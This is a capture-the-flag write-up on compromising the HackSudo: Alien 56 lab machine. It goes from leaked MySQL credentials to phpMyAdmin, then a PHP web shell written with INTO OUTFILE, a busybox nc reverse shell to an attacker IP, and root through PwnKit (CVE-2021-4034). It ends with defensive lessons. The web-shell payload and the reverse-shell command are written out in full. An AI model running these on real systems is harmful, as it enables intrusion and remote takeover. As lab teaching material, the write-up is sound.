# HackSudo: Alien 56 — Writeup

**Difficulty:** Easy–Medium
**Flag:** `flag={d045e6f9feb79e94442213f9d008ac48}`

## Recon

An initial scan revealed three open ports:

- **22** – SSH
- **80** – HTTP
- **9000** – phpMyAdmin

Browsing to port 80, a `backup` directory was discovered containing a file with MySQL credentials:

```
vishal:hacksudo
```

## Gaining Access to phpMyAdmin

Using the leaked credentials, I logged into phpMyAdmin on port 9000 as `vishal`.

## From phpMyAdmin to a Web Shell

Inside phpMyAdmin, I ran a query to confirm the MySQL data directory:

```sql
SHOW VARIABLES LIKE '%datadir%';
```

This confirmed the datadir as `/var/lib/mysql`, and more importantly confirmed that the web root (`/var/www/html`) was writable by MySQL. I used `INTO OUTFILE` to drop a simple PHP web shell:

```sql
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/shel.php';
```

## Command Execution → Reverse Shell

With the web shell in place, I confirmed code execution via the web server on port 80:

```bash
curl http://172.20.10.5/shel.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I then used it to pop a reverse shell with `busybox nc`:

```bash
curl http://172.20.10.5/shel.php? -G --data-urlencode 'cmd=busybox nc 172.20.10.4 4444 -e /bin/bash'
```

A listener on my attacking machine caught the connection as `www-data`.

## Privilege Escalation (PwnKit – CVE-2021-4034)

Enumerating SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/date
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
```

The presence of `pkexec` pointed to **PwnKit (CVE-2021-4034)**, a local privilege escalation vulnerability in Polkit's `pkexec`. I uploaded the PwnKit exploit, made it executable, and ran it:

```bash
chmod +x PwnKit
./PwnKit
```

This dropped a root shell immediately.

## Root Flag

```
flag={d045e6f9feb79e94442213f9d008ac48}
```

## Summary / Attack Chain

1. Port scan → found 22, 80, 9000
2. `/backup` dir on port 80 leaked MySQL credentials
3. Logged into phpMyAdmin (port 9000) with leaked creds
4. Abused `INTO OUTFILE` to write a PHP web shell into the web root
5. Got code execution as `www-data` → upgraded to a reverse shell
6. Found SUID `pkexec` → exploited with **PwnKit (CVE-2021-4034)**
7. Root ✅

## Lessons / Takeaways

- Never leave credential files (`mysql.creds`) in web-accessible backup directories.
- MySQL accounts with `FILE` privilege and a writable web root is a classic path to RCE via `INTO OUTFILE`.
- Keep `polkit`/`pkexec` patched — PwnKit remains a very common easy-box privesc vector.
